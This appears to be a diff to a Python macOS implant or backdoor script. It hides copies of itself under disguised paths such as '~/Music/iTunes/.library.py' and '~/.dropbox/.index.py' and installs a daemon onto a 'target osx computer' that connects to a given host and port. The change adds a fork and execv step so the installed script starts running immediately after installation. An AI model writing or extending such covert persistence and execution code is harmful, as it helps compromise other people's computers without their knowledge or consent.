@@ -618,7 +618,7 @@ SCRIPT_LOCS = ['~/Music/iTunes/.library.py', '~/.dropbox/.index.py']
 INSTALL_FLAG = '-install'
 
 
-def install_osx(host, port):
+def install_and_run_osx(host, port):
     '''
     Install onto target osx computer
     :param host: server host addr
@@ -661,8 +661,11 @@ def install_osx(host, port):
             except:
                 pass
     if daemon_loc is not None:
-        return True
-
+        if (os.fork() == 0):
+            os.chdir(script_dir)
+            os.execv(sys.executable, [sys.executable,os.path.basename(script_path)])
+        else:
+            return True
 
 if __name__ == "__main__":
     if INSTALL_FLAG in sys.argv:
@@ -672,7 +675,7 @@ if __name__ == "__main__":
         if len(sys.argv) > install_index+2:
             hostaddr = sys.argv[install_index+1]
             hostport = sys.argv[install_index+2]
-        install_osx(hostaddr,hostport)
+        install_and_run_osx(hostaddr,hostport)
     else:
         hostaddr = HOST
         hostport = PORT
